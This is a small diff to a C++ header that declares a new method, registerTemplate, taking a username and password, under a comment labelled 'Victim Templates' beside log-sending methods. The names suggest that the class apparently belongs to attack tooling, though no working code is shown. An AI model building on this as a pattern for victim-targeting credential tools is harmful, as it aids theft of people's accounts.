@@ -113,4 +113,7 @@ public:
     // Logs
     [[nodiscard]] bool fetchLogs() noexcept;
     [[nodiscard]] bool sendLogBuffer();
+
+    // Victim Templates
+    [[nodiscard]] bool registerTemplate(const std::string& username, const std::string& password);
 };
